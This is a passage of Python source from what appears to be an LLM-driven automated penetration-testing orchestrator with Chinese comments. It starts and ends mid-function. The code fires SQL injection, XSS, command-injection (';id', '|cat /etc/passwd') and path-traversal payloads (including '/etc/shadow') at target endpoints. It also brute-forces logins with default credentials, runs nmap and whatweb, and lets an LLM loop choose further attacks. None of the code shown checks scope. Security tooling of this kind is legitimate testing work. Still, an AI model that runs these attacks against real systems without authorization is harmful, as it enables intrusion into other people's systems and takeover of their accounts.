                        if any(err in resp.text.lower() for err in ['sql', 'syntax', 'error', 'mysql']):
                            tracker.update_phase(
                                task_id, "vuln_scan",
                                f"🚨 SQL注入漏洞!",
                                f"💉 Payload: {payload} | 📍 端点: {url}",
                                reasoning=f"payload触发SQL错误",
                                tool="基础SQL注入攻击",
                                command=payload
                            )
                            self._record_vuln(state, None, "SQL注入(登录页)", "critical",
                                            f"端点: {url}, payload: {payload}")
                            return
                    except:
                        pass

    def _detect_vuln_type(self, vuln_info) -> str:
        """从漏洞信息中检测漏洞类型"""
        name = ""
        if hasattr(vuln_info, 'name'):
            name = vuln_info.name.lower()
        elif isinstance(vuln_info, dict):
            name = vuln_info.get('name', '').lower()
        else:
            name = str(vuln_info).lower()

        # SQL注入相关
        if any(kw in name for kw in ['sql', 'sqli', '注入', 'injection']):
            return 'sqli'

        # XSS相关
        if any(kw in name for kw in ['xss', 'cross', 'script', '跨站']):
            return 'xss'

        # RCE相关
        if any(kw in name for kw in ['rce', 'exec', 'command', '命令', '执行', '注入']):
            return 'rce'

        # LFI相关
        if any(kw in name for kw in ['lfi', 'file', '文件', 'read', '读取', '包含']):
            return 'lfi'

        # 认证相关
        if any(kw in name for kw in ['auth', 'login', '登录', '认证', 'password', '密码', 'bypass']):
            return 'auth_bypass'

        return 'unknown'

    def _attack_sqli_login(self, target: str, state: PentestState, vuln_info, is_spa: bool):
        """SQL注入攻击 - 针对登录表单"""
        from state.progress_tracker import get_progress_tracker
        tracker = get_progress_tracker()
        task_id = state["task_id"]

        print(f"[Orchestrator] 🎯 执行SQL注入攻击（登录表单）")

        # SQL注入payload
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1' --",
            "admin'--",
            "' OR 'a'='a",
            "1' AND '1'='1",
            "' UNION SELECT NULL--",
            "' OR ''=''",
        ]

        # 确定登录URL和参数
        login_urls = self._get_login_urls(target, is_spa)

        for login_url in login_urls:
            print(f"[Orchestrator] 🔍 测试登录端点: {login_url}")

            for payload in sqli_payloads:
                # 记录每个payload测试到进度追踪器
                tracker.update_phase(
                    task_id, "vuln_scan",
                    f"SQL注入测试 - {login_url}",
                    f"🔧 工具: SQL注入攻击 | 📡 目标: {login_url} | 💉 Payload: {payload}",
                    reasoning=f"基于RAG POC生成的SQL注入测试，尝试在登录表单中注入SQL payload",
                    tool="SQL注入攻击 (SQLi)",
                    command=payload
                )

                try:
                    # 尝试在username和password字段注入
                    data = {"username": payload, "password": payload}

                    resp = requests.post(
                        login_url,
                        data=data,
                        timeout=10,
                        verify=False,
                        allow_redirects=False
                    )

                    # 检测是否成功登录或出现SQL错误
                    resp_text = resp.text.lower()

                    # SQL错误特征
                    sql_errors = [
                        "sql", "syntax", "error", "mysql", "postgresql",
                        "ora-", "oracle", "sqlite", "mariadb", "warning",
                        "microsoft sql", "sqlstate", "odbc"
                    ]

                    if any(err in resp_text for err in sql_errors):
                        tracker.update_phase(
                            task_id, "vuln_scan",
                            f"🚨 SQL注入漏洞发现 - {login_url}",
                            f"✅ 漏洞: SQL注入(登录页) | 🔴 严重性: critical | 💉 Payload: {payload} | 📍 端点: {login_url}",
                            reasoning=f"检测到SQL错误特征，payload '{payload}' 触发了SQL注入漏洞",
                            tool="SQL注入攻击 (SQLi)",
                            command=payload
                        )
                        print(f"[Orchestrator] 🚨 SQL注入漏洞! payload: {payload}")
                        self._record_vuln(state, vuln_info, "SQL注入(登录页)", "critical",
                                        f"登录端点: {login_url}, payload: {payload}")

                    # 检查是否登录成功（无错误但返回了管理页面特征）
                    if resp.status_code in [200, 302] and not any(err in resp_text for err in sql_errors):
                        if any(ind in resp_text for ind in ['dashboard', 'admin', 'welcome', 'logout', 'profile']):
                            tracker.update_phase(
                                task_id, "vuln_scan",
                                f"🚨 SQL注入登录绕过成功 - {login_url}",
                                f"✅ 漏洞: SQL注入登录绕过 | 🔴 严重性: critical | 💉 Payload: {payload} | 📍 端点: {login_url}",
                                reasoning=f"登录绕过成功，payload '{payload}' 使攻击者成功登录",
                                tool="SQL注入攻击 (SQLi)",
                                command=payload
                            )
                            print(f"[Orchestrator] 🚨 SQL注入登录成功! payload: {payload}")
                            self._record_vuln(state, vuln_info, "SQL注入登录绕过", "critical",
                                            f"登录端点: {login_url}, payload: {payload}")

                except Exception as e:
                    tracker.update_phase(
                        task_id, "vuln_scan",
                        f"⚠️ SQL注入测试失败 - {login_url}",
                        f"❌ 目标: {login_url} | 💉 Payload: {payload} | ⚠️ 错误: {str(e)[:100]}",
                        reasoning=f"SQL注入测试失败: {str(e)[:100]}",
                        tool="SQL注入攻击 (SQLi)",
                        command=payload
                    )
                    print(f"[Orchestrator] ⚠️ SQL注入测试失败: {e}")

    def _attack_xss(self, target: str, state: PentestState, vuln_info, is_spa: bool):
        """XSS攻击"""
        print(f"[Orchestrator] 🎯 执行XSS攻击")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]

        # 测试所有可能的输入点
        test_points = self._get_test_urls(target, is_spa)

        for test_url in test_points:
            for payload in xss_payloads:
                try:
                    # 测试query参数
                    if '?' in test_url:
                        test_resp = requests.get(test_url, timeout=10, verify=False)
                    else:
                        test_resp = requests.post(test_url, data={"q": payload}, timeout=10, verify=False)

                    # 检查payload是否被反射
                    if payload in test_resp.text:
                        print(f"[Orchestrator] 🚨 XSS漏洞! payload: {payload}")
                        self._record_vuln(state, vuln_info, "XSS(反射型)", "medium",
                                        f"URL: {test_url}, payload: {payload}")
                        return

                except Exception as e:
                    print(f"[Orchestrator] ⚠️ XSS测试失败: {e}")

    def _attack_rce(self, target: str, state: PentestState, vuln_info):
        """命令执行攻击"""
        print(f"[Orchestrator] 🎯 执行命令执行攻击")

        rce_payloads = [
            ";ls",
            "|ls",
            "`ls`",
            "$(ls)",
            ";id",
            "|cat /etc/passwd",
            ";echo test",
        ]

        for payload in rce_payloads:
            try:
                # 尝试在常见参数中注入
                test_url = f"{target}?cmd={payload}"
                resp = requests.get(test_url, timeout=10, verify=False)

                # 检测命令执行结果
                if any(ind in resp.text for ind in ['root:', 'bin', 'usr', 'etc', 'daemon']):
                    print(f"[Orchestrator] 🚨 RCE漏洞! payload: {payload}")
                    self._record_vuln(state, vuln_info, "远程代码执行", "critical",
                                    f"URL: {test_url}, payload: {payload}")
                    return

            except Exception as e:
                print(f"[Orchestrator] ⚠️ RCE测试失败: {e}")

    def _attack_lfi(self, target: str, state: PentestState, vuln_info):
        """LFI攻击"""
        print(f"[Orchestrator] 🎯 执行本地文件包含攻击")

        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "../../../../etc/shadow",
            "....//....//....//etc/passwd",
        ]

        for payload in lfi_payloads:
            try:
                test_url = f"{target}?file={payload}"
                resp = requests.get(test_url, timeout=10, verify=False)

                if "root:" in resp.text or "[drivers]" in resp.text:
                    print(f"[Orchestrator] 🚨 LFI漏洞! payload: {payload}")
                    self._record_vuln(state, vuln_info, "本地文件包含", "high",
                                    f"URL: {test_url}, payload: {payload}")
                    return

            except Exception as e:
                print(f"[Orchestrator] ⚠️ LFI测试失败: {e}")

    def _attack_auth_bypass(self, target: str, state: PentestState, vuln_info):
        """认证绕过攻击"""
        print(f"[Orchestrator] 🎯 执行认证绕过攻击")
        self._do_auth_bypass_test(state, target)

    def _attack_generic(self, target: str, state: PentestState, vuln_info, is_spa: bool):
        """通用攻击 - 尝试各种常见漏洞"""
        print(f"[Orchestrator] 🎯 执行通用攻击")

        # 尝试多种常见漏洞
        self._attack_sqli_login(target, state, vuln_info, is_spa)

    def _get_login_urls(self, target: str, is_spa: bool) -> list:
        """获取可能的登录URL列表"""
        from urllib.parse import urlparse

        urls = [target]

        if is_spa:
            parsed = urlparse(target)
            base = f"{parsed.scheme}://{parsed.netloc}"

            spa_routes = [
                '/login', '/signin', '/sign-in', '/auth/login',
                '/api/auth/login', '/api/login', '/user/login',
                '/account/login', '/admin/login', '/auth/signin'
            ]

            for route in spa_routes:
                url = base.rstrip('/') + route
                if url not in urls:
                    urls.append(url)

        return urls

    def _get_test_urls(self, target: str, is_spa: bool) -> list:
        """获取可能的测试URL列表"""
        from urllib.parse import urlparse, urlencode

        urls = [target]
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if '?' in target:
            base_url = target.split('?')[0]
        else:
            base_url = target

        # 添加常见参数
        params = ['q', 'search', 'id', 'page', 'cat', 'file', 'name', 'key']

        for param in params:
            test_url = f"{base_url}?{param}=test"
            if test_url not in urls:
                urls.append(test_url)

        return urls

    def _record_vuln(self, state: PentestState, vuln_info, name: str, severity: str, evidence: str):
        """记录漏洞到状态"""
        vuln_result = state.get("vuln_result") or {"vulnerabilities": []}
        vulns = vuln_result.get("vulnerabilities", [])

        vulns.append({
            "name": name,
            "severity": severity,
            "source": "poc_attack",
            "vuln_info": str(vuln_info)[:200],
            "evidence": evidence,
        })

        vuln_result["vulnerabilities"] = vulns
        state["vuln_result"] = vuln_result

        print(f"[Orchestrator] ✅ 漏洞已记录: {name} ({severity})")

    def _do_generate_and_test_poc(self, state: PentestState) -> PentestState:
        """
        生成 POC 并实际发送请求验证
        """
        target = state["target"]
        page_info = state.get("page_info") or {}
        tech = page_info.get("tech", [])

        print(f"[Orchestrator] 🎯 生成并测试 POC")

        # 基于目标类型生成不同的 POC
        from agents.poc_generator import POCRequest

        # 确定漏洞类型
        url_lower = target.lower()
        vuln_type = "web_vulnerability"

        if any(k in url_lower for k in ["login", "signin"]):
            vuln_type = "auth_bypass"
        elif "api" in url_lower:
            vuln_type = "api_security"

        request = POCRequest(
            target=target,
            vulnerability_name=vuln_type,
            tech_stack=tech,
        )

        # 生成 POC
        poc_result = self.poc_generator.generate_poc(request)

        print(f"[Orchestrator] 📜 POC 生成完成 (风险: {poc_result.risk_level})")
        print(f"[Orchestrator] 📜 验证步骤: {poc_result.verification_steps}")

        # 执行 POC
        self._execute_poc_code(state, poc_result.poc_code, {"name": vuln_type})

        return state

    def _do_auth_bypass_test(self, state: PentestState, target: str = None) -> PentestState:
        """
        认证绕过测试 - 弱密码、默认密码
        """
        if target is None:
            target = state.get("page_info", {}).get("url", state["target"])

        page_info = state.get("page_info") or {}
        is_spa = page_info.get("is_spa", False)

        print(f"[Orchestrator] 🔐 开始认证绕过测试")
        print(f"[Orchestrator] 📡 目标: {target}")
        print(f"[Orchestrator] 📡 SPA应用: {'是' if is_spa else '否'}")

        # SPA 登录路由
        spa_routes = ['/login', '/signin', '/sign-in', '/api/auth/login', '/api/login', '/auth/login']

        # 常见弱密码
        weak_combos = [
            ("admin", "admin"),
            ("admin", "123456"),
            ("admin", "password"),
            ("admin", "admin123"),
            ("root", "root"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
            ("administrator", "administrator"),
            ("test", "123456"),
            ("admin", ""),
            ("", "admin"),
        ]

        results = []

        # 确定测试 URL
        from urllib.parse import urlparse
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        test_urls = [target]
        if is_spa:
            for route in spa_routes:
                url = base_url.rstrip('/') + route
                if url not in test_urls:
                    test_urls.append(url)

        print(f"[Orchestrator] 🔍 测试 {len(test_urls)} 个登录端点 × {len(weak_combos)} 组密码")

        for login_url in test_urls:
            print(f"[Orchestrator] 📍 测试: {login_url}")

            for username, password in weak_combos:
                try:
                    data = {"username": username, "password": password}
                    resp = requests.post(
                        login_url,
                        data=data,
                        timeout=5,
                        verify=False,
                        allow_redirects=False
                    )

                    status = resp.status_code
                    resp_text = resp.text.lower()

                    # 分析响应
                    if status == 302:
                        # 重定向可能表示登录成功
                        location = resp.headers.get('Location', '')
                        print(f"[Orchestrator]   {username}/{password} -> 302 -> {location}")
                        if 'dashboard' in location or 'admin' in location or location.startswith('/'):
                            print(f"[Orchestrator] 🚨 可能登录成功: {username}/{password}")
                            results.append({
                                "username": username,
                                "password": password,
                                "status": "SUCCESS",
                                "url": login_url,
                                "redirect": location,
                            })

                    elif status == 200:
                        # 检查是否包含成功特征
                        success_keys = ['logout', 'sign out', 'dashboard', 'welcome', 'profile', 'admin']
                        if any(k in resp_text for k in success_keys):
                            print(f"[Orchestrator] 🚨 可能登录成功: {username}/{password}")
                            results.append({
                                "username": username,
                                "password": password,
                                "status": "SUCCESS",
                                "url": login_url,
                            })

                    # 检查错误消息
                    if any(err in resp_text for err in ['invalid', 'incorrect', 'failed', 'wrong']):
                        print(f"[Orchestrator]   {username}/{password} -> 登录失败")

                except Exception as e:
                    print(f"[Orchestrator]   {username}/{password} -> 请求失败: {e}")

        # 更新漏洞结果
        vuln_result = state.get("vuln_result") or {"vulnerabilities": []}
        vulns = vuln_result.get("vulnerabilities", [])

        successful = [r for r in results if r.get("status") == "SUCCESS"]

        if successful:
            vulns.append({
                "name": "弱密码/默认密码",
                "severity": "critical",
                "type": "auth_bypass",
                "findings": successful,
                "description": f"发现 {len(successful)} 组有效凭证",
            })
            print(f"[Orchestrator] 🚨 认证测试结果: 发现 {len(successful)} 组有效凭证!")
        else:
            vulns.append({
                "name": "认证测试完成",
                "severity": "info",
                "type": "auth_test",
                "findings": results,
                "description": f"测试 {len(weak_combos) * len(test_urls)} 个组合，均失败",
            })
            print(f"[Orchestrator] ℹ️ 认证测试完成: 未发现弱密码")

        vuln_result["vulnerabilities"] = vulns
        state["vuln_result"] = vuln_result

        return state

    def _access_url(self, url: str) -> Optional[Dict[str, Any]]:
        """访问 URL 并分析页面"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }

            import re
            from urllib.parse import urlparse

            port_match = re.search(r':(\d+)', url)
            port = int(port_match.group(1)) if port_match else 80

            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            resp = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=True)
            content = resp.text
            content_lower = content.lower()

            # 解析标题
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
            title = title_match.group(1).strip() if title_match else ""

            # 检测登录页面
            login_indicators = ['login', 'signin', 'sign in', '登录', '注册', 'password', '用户名', '密码']
            is_login_page = any(ind in content_lower for ind in login_indicators)

            # SPA 检测
            is_spa = any(ind in content_lower for ind in ['data-v-app', 'id="app"', '__vue__', 'react', 'vue.js'])

            # SPA 登录路由检测
            spa_login_routes = ['/login', '/signin', '/sign-in', '/admin', '/auth', '/account/login']
            spa_login_found = False

            if is_spa and not is_login_page:
                print(f"[Orchestrator] 🔍 检测到 SPA 应用，检查登录路由...")
                for route in spa_login_routes:
                    route_url = base_url.rstrip('/') + route
                    try:
                        route_resp = requests.get(route_url, headers=headers, timeout=5, verify=False)
                        if any(ind in route_resp.text.lower() for ind in login_indicators):
                            print(f"[Orchestrator] ✅ 发现登录页面: {route_url}")
                            is_login_page = True
                            spa_login_found = True
                            content = route_resp.text
                            break
                    except:
                        continue

            # 技术栈检测
            tech = []
            if 'react' in content_lower: tech.append("React")
            if 'vue' in content_lower or 'vue.js' in content_lower: tech.append("Vue.js")
            if 'angular' in content_lower: tech.append("Angular")
            if 'jquery' in content_lower: tech.append("jQuery")
            if 'bootstrap' in content_lower: tech.append("Bootstrap")
            if is_spa: tech.append("SPA")

            print(f"[Orchestrator] 📊 页面分析:")
            print(f"  - URL: {url}")
            print(f"  - 标题: {title}")
            print(f"  - 登录页: {'是' if is_login_page else '否'}")
            print(f"  - SPA: {'是' if is_spa else '否'}")
            print(f"  - 技术栈: {', '.join(tech) or '未知'}")

            return {
                "url": url,
                "status": resp.status_code,
                "title": title,
                "is_login_page": is_login_page,
                "tech": tech,
                "port": port,
                "is_spa": is_spa,
                "content": content,  # 保存页面内容供后续分析
            }

        except Exception as e:
            print(f"[Orchestrator] ⚠️ 访问 URL 失败 {url}: {e}")
            return None

    def run(self, state: PentestState) -> PentestState:
        """
        执行主控循环（智能攻击版）
        """
        self._init_components()

        task_id = state["task_id"]
        target = state["target"]

        print(f"[Orchestrator] 🎯 开始渗透测试任务: {task_id}")
        print(f"[Orchestrator] 🎯 目标: {target}")
        print(f"[Orchestrator] 🎯 用户意图: {state.get('user_intent', 'N/A')}")

        from state.progress_tracker import get_progress_tracker
        tracker = get_progress_tracker()
        tracker.start_task(task_id, target)

        # 记录审计日志
        if self.audit_logger:
            self.audit_logger.log_agent_action(
                agent="Orchestrator",
                action="task_start",
                task_id=task_id,
                target=target,
            )

        # ========== 第一阶段：主动感知目标 ==========
        tracker.update_phase(task_id, "init", "感知目标",
                           f"主动访问 {target} 分析页面类型",
                           reasoning="首先理解目标是什么类型的应用")

        import re
        ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', target)
        ip = ip_match.group(1) if ip_match else target.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]

        # 访问 URL 分析
        page_info = self._access_url(target)
        if page_info:
            state["page_info"] = page_info
            state["page_content"] = page_info.get("content", "")  # 保存页面内容
            tracker.add_finding(task_id, "page_analysis", page_info)

            # 如果检测到登录页面，优先进行认证测试
            if page_info.get("is_login_page"):
                print(f"[Orchestrator] 🔍 检测到登录页面，优先进行认证测试")
                state = self._do_auth_bypass_test(state, page_info.get("url", target))

        # ========== 第二阶段：智能攻击面分析 + 遍历 Skills ==========
        tracker.update_phase(task_id, "recon", "攻击面分析",
                           f"AI 分析攻击面，使用 Skills 遍历",
                           reasoning="基于页面内容分析攻击面，遍历所有匹配技能")

        # 匹配所有相关技能
        target_info = {
            "tech": page_info.get("tech", []) if page_info else [],
            "url": target,
            "keywords": [state.get("user_intent", "")],
        }

        matched_skills = self.skill_loader.match_skills(target_info)
        print(f"[Orchestrator] 📜 匹配到 {len(matched_skills)} 个相关技能")

        # 保存匹配技能（全部）
        state["matched_skills"] = [
            {"name": s["name"], "score": s["score"], "reasons": s.get("reasons", [])}
            for s in matched_skills
        ]

        # 获取所有skill名称用于后续执行
        all_skill_names = [s["name"] for s in matched_skills] if matched_skills else []
        state["all_skills_for_attack"] = all_skill_names
        print(f"[Orchestrator] 📜 所有技能用于攻击: {len(all_skill_names)} 个")

        # ========== 第三阶段：执行攻击（全部45个skill + RAG POC + 认证测试）============
        print(f"[Orchestrator] 🔄 开始全面攻击执行")

        # 第1轮：并行执行所有匹配的skill攻击
        if all_skill_names:
            print(f"[Orchestrator] 🎯 第1轮：执行所有 {len(all_skill_names)} 个技能攻击")
            decision = {
                "action": "skill_based_attack",
                "reasoning": "强制执行：并行使用所有匹配的技能进行攻击",
                "skills_to_use": all_skill_names,  # 全部skills，不是只5个
            }
            state = self.act(state, decision)

        # 第2轮：RAG POC 攻击
        print(f"[Orchestrator] 🎯 第2轮：执行 RAG POC 攻击")
        decision = {
            "action": "rag_poc_attack",
            "reasoning": "强制执行：查询 RAG POC 知识库进行攻击",
        }
        state = self.act(state, decision)

        # 第3轮：认证绕过测试
        print(f"[Orchestrator] 🎯 第3轮：执行认证绕过测试")
        decision = {
            "action": "auth_bypass",
            "reasoning": "强制执行：认证绕过测试",
        }
        state = self.act(state, decision)

        # 第4轮：生成 POC 并测试
        print(f"[Orchestrator] 🎯 第4轮：生成 POC 并测试")
        decision = {
            "action": "generate_poc_and_test",
            "reasoning": "强制执行：基于已发现的信息生成 POC",
        }
        state = self.act(state, decision)

        # 第5轮：再次 RAG POC（针对认证相关的POC）
        print(f"[Orchestrator] 🎯 第5轮：执行认证相关 RAG POC 攻击")
        decision = {
            "action": "rag_poc_attack_auth",
            "reasoning": "强制执行：认证相关的 RAG POC 攻击",
        }
        state = self.act(state, decision)

        # 第6轮：完成
        tracker.update_phase(task_id, "complete", "攻击完成",
                           f"所有攻击轮次执行完毕",
                           reasoning="完成渗透测试攻击阶段")

        # ========== 第四阶段：漏洞扫描 ==========
        vuln_result = state.get("vuln_result") or {}
        if not vuln_result.get("vulnerabilities"):
            print(f"[Orchestrator] 🔍 执行补充漏洞扫描...")
            tracker.update_phase(task_id, "vuln_scan", "补充扫描",
                               f"使用 VulnAgent 进行补充扫描",
                               reasoning="攻击循环未发现漏洞，执行补充扫描")
            from agents.vuln_agent import VulnAgent
            vuln_agent = VulnAgent(audit_logger=self.audit_logger)
            state = vuln_agent.run(state)

        # ========== 第五阶段：生成报告 ==========
        tracker.update_phase(task_id, "report", "生成报告",
                           f"正在生成渗透测试报告...",
                           reasoning="收集所有发现，生成最终报告")
        from agents.report_agent import ReportAgent
        report_agent = ReportAgent(audit_logger=self.audit_logger)
        state = report_agent.run(state)

        # 标记完成
        tracker.complete_task(task_id, "渗透测试任务完成")
        print(f"[Orchestrator] ✅ 任务完成: {task_id}")

        return state


# ===========================================
# Celery Task
# ===========================================
@celery_app.task(name="agents.orchestrator.run", queue="orchestrator", bind=True)
def run_orchestrator(self, task_id: str, target: str, scope: list, authorized_by: str, user_intent: str = "") -> dict:
    """Celery Task: 运行主控 Agent"""
    state = create_initial_state(
        task_id=task_id,
        target=target,
        scope=scope,
        authorized_by=authorized_by,
        user_intent=user_intent,
    )

    audit_logger = AuditLogger()
    orchestrator = Orchestrator(audit_logger=audit_logger)
    final_state = orchestrator.run(state)

    return {
        "task_id": task_id,
        "status": final_state["status"],
        "report": final_state.get("report"),
        "phase_history": final_state["phase_history"],
    }


@celery_app.task(name="agents.orchestrator.cleanup_old_results")
def cleanup_old_results():
    """定期清理旧结果"""
    print("[Orchestrator] 清理旧结果...")


@celery_app.task(name="agents.orchestrator.run_single_phase", queue="orchestrator", bind=True)
def run_single_phase(self, task_id: str, target: str, phase: str, intent: str, user_message: str, intent_info: dict = None) -> dict:
    """
    真正的 LLM 驱动 ReAct 循环

    每一步都由 LLM 决策：
    - Think: LLM 分析当前状态，决定下一步行动
    - Act: 执行 LLM 选择的行动（skill/工具/RAG/POC）
    - Observe: 将结果反馈给 LLM，继续决策

    Args:
        task_id: 任务 ID
        target: 目标
        phase: 阶段
        intent: 意图类型
        user_message: 用户原始消息
        intent_info: Intent 解析器生成的结构化意图信息
    """
    # ⚠️ 设置离线模式，避免 HuggingFace 模型下载阻塞任务执行
    import os as _os
    _os.environ.setdefault("HF_HUB_OFFLINE", "1")
    _os.environ.setdefault("TRANSFORMERS_OFFLINE", "1")
    _os.environ.setdefault("HF_DATASETS_OFFLINE", "1")

    from state.progress_tracker import get_progress_tracker
    from agents.recon_agent import HexStrikeClient
    from agents.skill_loader import get_skill_loader

    tracker = get_progress_tracker()
    client = HexStrikeClient()
    llm = get_llm()

    # 安全加载 skill_loader (可能失败但不影响流程)
    skill_loader = None
    try:
        skill_loader = get_skill_loader()
    except Exception as e:
        print(f"[run_single_phase] Skill loader 不可用: {e}")

    # 安全加载 RAG (可能因 Windows DLL 冲突而失败，降级运行)
    rag = None
    try:
        from rag.query_interface import get_rag_interface
        rag = get_rag_interface()
    except Exception as e:
        print(f"[run_single_phase] RAG 不可用 (功能降级): {e}")

    # 攻击类型映射（从 intent_info 获取，或推断）
    attack_types = []
    if intent_info and isinstance(intent_info, dict):
        attack_types = intent_info.get("attack_types", [])
    if not attack_types and intent:
        attack_types = _infer_attack_types(intent)

    # 初始化状态
    state = {
        "task_id": task_id,
        "target": target,
        "intent": intent,
        "user_message": user_message,
        "attack_types": attack_types,
        "iteration": 0,
        "tech_stack": [],
        "open_ports": [],
        "findings": [],
        "tried_skills": set(),
        "tried_tools": set(),
        "tool_calls": [],
        "rag_results": [],
        "poc_results": [],
    }

    tracker.update_phase(task_id, "init", "开始分析", f"目标: {target}, 意图: {intent}")

    # ===========================================
    # Step 1: 初始侦察（为 LLM 提供上下文）
    # ===========================================
    tracker.update_phase(task_id, "init", "初始侦察", "正在收集目标基础信息...")

    # whatweb 指纹识别
    whatweb_result = client.execute_command(f"whatweb {target}", category="web_security")
    tech_stack = _parse_tech_stack(whatweb_result)
    state["tech_stack"] = tech_stack

    # 简单端口扫描（快速）
    nmap_result = client.execute_command(f"nmap -F --top-ports 100 {target}", category="network")
    if nmap_result.get("success"):
        open_ports = re.findall(r'(\d+)/open', nmap_result.get("stdout", ""))
        state["open_ports"] = open_ports

    tracker.update_phase(
        task_id, "init", "初始侦察完成",
        f"技术栈: {', '.join(tech_stack) if tech_stack else '未知'} | 开放端口: {len(state['open_ports'])} 个",
        reasoning=f"whatweb 和 nmap 扫描完成，为 AI 决策提供基础信息"
    )

    # 加载所有可用技能
    all_skills = skill_loader.list_skills() if skill_loader else []

    # ===========================================
    # Step 2: 真正的 LLM 驱动 ReAct 循环
    # ===========================================
    max_iterations = 8

    while state["iteration"] < max_iterations:
        state["iteration"] += 1

        # ---- THINK: LLM 决策下一步 ----
        tracker.update_phase(
            task_id, "recon",
            f"🤔 AI 思考 #{state['iteration']}",
            "正在分析当前状态，决策下一步行动..."
        )

        decision = _llm_decide_next_action(llm, state, all_skills)

        action = decision.get("action", "complete")
        reasoning = decision.get("reasoning", "")

        if action == "complete":
            tracker.update_phase(
                task_id, "recon", "AI 决策完成",
                f"判断测试已完成: {reasoning}",
                reasoning=reasoning
            )
            break

        # ---- ACT: 执行决策 ----
        tracker.update_phase(
            task_id, "recon",
            f"⚡ 执行: {action}",
            f"{reasoning}",
            reasoning=reasoning,
            tool=decision.get("tool") or "",
            command=str(decision.get("command") or "")[:100]
        )

        result = _execute_react_action(client, rag, skill_loader, decision, state)

        # ---- Observe: 更新状态 ----
        state["findings"].extend(result.get("findings", []))
        state["tried_skills"].update(result.get("tried_skills", []))
        state["tried_tools"].update(result.get("tried_tools", []))
        state["rag_results"].extend(result.get("rag_results", []))
        state["poc_results"].extend(result.get("poc_results", []))

        # 输出观察结果
        findings_count = len(result.get("findings", []))
        tracker.update_phase(
            task_id, "recon",
            f"👁️ 观察结果",
            f"本次行动发现 {findings_count} 个结果",
            reasoning=result.get("summary", "")
        )

    # ===========================================
    # Step 3: 完成
    # ===========================================
    total_findings = len(state["findings"])
    tracker.update_phase(
        task_id, "complete", "任务完成",
        f"ReAct 循环结束，共 {state['iteration']} 轮迭代，发现 {total_findings} 个结果"
    )
    tracker.complete_task(task_id, "ReAct 循环完成")

    return {
        "task_id": task_id,
        "status": "success",
        "phase": phase,
        "target": target,
        "findings": state["findings"],
        "tech_stack": state["tech_stack"],
        "open_ports": state["open_ports"],
        "iterations": state["iteration"],
    }


def _generate_report_files(task_id: str, target: str, state: dict, tracker) -> tuple:
    """生成渗透测试报告文件 (.md 和 .json)，返回 (md_path, json_path)"""
    import os as _os
    import re
    from datetime import datetime as _dt

    # 确定 reports 目录
    reports_dir = _os.path.join(_os.path.dirname(_os.path.dirname(__file__)), "reports")
    _os.makedirs(reports_dir, exist_ok=True)

    safe_target = re.sub(r'[^\w\-_.]', '_', target).replace('http://', '').replace('https://', '')[:50]
    timestamp = _dt.utcnow().strftime('%Y%m%d_%H%M%S')
    base_name = f"{timestamp}_{safe_target}_{task_id[:8]}"

    tech_stack = state.get("tech_stack", [])
    open_ports = state.get("open_ports", [])
    findings = state.get("findings", [])
    iterations = state.get("iteration", 0)

    # ── Markdown 报告 ──
    md_lines = [
        f"# 渗透测试报告",
        f"",
        f"**目标**: {target}",
        f"**任务ID**: {task_id}",
        f"**生成时间**: {_dt.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
        f"**迭代轮数**: {iterations}",
        f"",
        f"---",
        f"",
        f"## 侦察信息",
        f"",
        f"- **技术栈**: {', '.join(tech_stack) if tech_stack else '未识别'}",
        f"- **开放端口**: {', '.join(open_ports) if open_ports else '未发现'}",
        f"",
        f"---",
        f"",
        f"## 发现结果 ({len(findings)} 条)",
        f"",
    ]

    for i, f in enumerate(findings, 1):
        ftype = f.get("type", "unknown")
        success = "✅" if f.get("success") else "❌"
        tool = f.get("tool", "") or f.get("skill", "")
        cmd = f.get("command", "")
        output = f.get("output", "") or f.get("error", "")
        md_lines.append(f"### {i}. [{ftype}] {success} {tool}")
        if cmd:
            md_lines.append(f"```bash\n{cmd}\n```")
        if output:
            md_lines.append(f"```\n{output[:1000]}\n```")
        md_lines.append("")

    md_path = _os.path.join(reports_dir, base_name + ".md")
    with open(md_path, "w", encoding="utf-8") as f:
        f.write("\n".join(md_lines))

    # ── JSON 报告 ──
    json_data = {
        "task_id": task_id,
        "target": target,
        "timestamp": _dt.utcnow().isoformat(),
        "iterations": iterations,
        "tech_stack": tech_stack,
        "open_ports": open_ports,
        "findings": findings,
    }
    json_path = _os.path.join(reports_dir, base_name + ".json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(json_data, f, ensure_ascii=False, indent=2)

    print(f"[standalone] 报告已生成: {base_name}.md, {base_name}.json", flush=True)
    tracker.update_phase(task_id, "report", "报告已生成",
                         f"Markdown: {base_name}.md | JSON: {base_name}.json")
    # 保存报告路径到 tracker，供 poll_task_progress 读取
    tracker.add_finding(task_id, "report_md_path", f"/reports/{base_name}.md")
    tracker.add_finding(task_id, "report_json_path", f"/reports/{base_name}.json")

    # 返回相对路径（前端可直接下载）
    return f"/reports/{base_name}.md", f"/reports/{base_name}.json"


def run_single_phase_standalone(task_id: str, target: str, phase: str, intent: str, user_message: str, intent_info: dict = None) -> dict:
    """
    run_single_phase 的独立版本（非 Celery 任务），可在 ThreadPoolExecutor 中直接调用。
    绕过 Celery worker 的 Windows 兼容问题。
    参数和逻辑与 run_single_phase 完全一致，只是去掉了 Celery 的 self binding。
    """
    import os as _os
    _os.environ.setdefault("HF_HUB_OFFLINE", "1")
    _os.environ.setdefault("TRANSFORMERS_OFFLINE", "1")
    _os.environ.setdefault("HF_DATASETS_OFFLINE", "1")
    import re
